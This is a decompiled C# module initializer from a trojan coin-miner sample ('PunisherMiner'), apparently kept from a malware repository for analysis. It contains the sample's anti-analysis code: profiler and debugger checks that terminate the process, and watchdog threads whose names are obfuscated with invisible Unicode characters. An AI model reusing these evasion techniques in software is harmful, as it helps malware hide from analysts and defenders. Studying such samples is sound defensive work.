// Decompiled with JetBrains decompiler
// Type: <Module>
// Assembly: PunisherMiner, Version=3.0.2.4, Culture=neutral, PublicKeyToken=null
// MVID: 0E56BAA9-6097-4239-A28F-F65DA3522EC4
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.MSIL.Miner.gen-1f563cbfc0379c29f15ea1e40466bd6b73233a51a720f3af9adb68f1828968c8.exe

using System;
using System.Diagnostics;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Threading;

internal class \u003CModule\u003E
{
  static \u003CModule\u003E()
  {
    MethodInfo method = typeof (Environment).GetMethod("GetEnvironmentVariable", new Type[1]
    {
      typeof (string)
    });
    if ((object) method != null)
    {
      if ("1".Equals(method.Invoke((object) null, new object[1]
      {
        (object) "COR_ENABLE_PROFILING"
      })))
        Environment.FailFast((string) null);
    }
    new Thread(new ParameterizedThreadStart(\u003CModule\u003E.\u206C⁮‪‍‎‭‬⁭‪‬‫⁮‫⁭⁯⁫⁪‫‎​‌⁪⁯⁪‮‏‬‬‪‌⁮‮‏⁫‬⁫⁭‪‪‍‮))
    {
      IsBackground = true
    }.Start((object) null);
  }

  private static void \u206C⁮‪‍‎‭‬⁭‪‬‫⁮‫⁭⁯⁫⁪‫‎​‌⁪⁯⁪‮‏‬‬‪‌⁮‮‏⁫‬⁫⁭‪‪‍‮([In] object obj0)
  {
    if (!(obj0 is Thread thread))
    {
      thread = new Thread(new ParameterizedThreadStart(\u003CModule\u003E.\u206C⁮‪‍‎‭‬⁭‪‬‫⁮‫⁭⁯⁫⁪‫‎​‌⁪⁯⁪‮‏‬‬‪‌⁮‮‏⁫‬⁫⁭‪‪‍‮));
      thread.IsBackground = true;
      thread.Start((object) Thread.CurrentThread);
      Thread.Sleep(500);
    }
    while (true)
    {
      if (Debugger.IsAttached || Debugger.IsLogging())
        Environment.FailFast((string) null);
      if (!thread.IsAlive)
        Environment.FailFast((string) null);
      Thread.Sleep(1000);
    }
  }
}
